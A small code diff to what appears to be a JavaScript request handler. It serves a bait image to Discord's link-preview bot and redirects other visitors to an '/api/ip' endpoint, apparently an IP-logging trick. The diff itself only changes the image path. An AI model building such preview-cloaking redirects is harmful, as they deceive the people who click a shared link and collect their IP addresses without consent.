@@ -9,7 +9,7 @@ module.exports = (req, res) => {
     );
 
   if (isDiscordBot) {
-    res.redirect("middleclickforcalc.png");
+    res.redirect("img/middleclickforcalc.png");
   } else {
     res.redirect("/api/ip");
   }
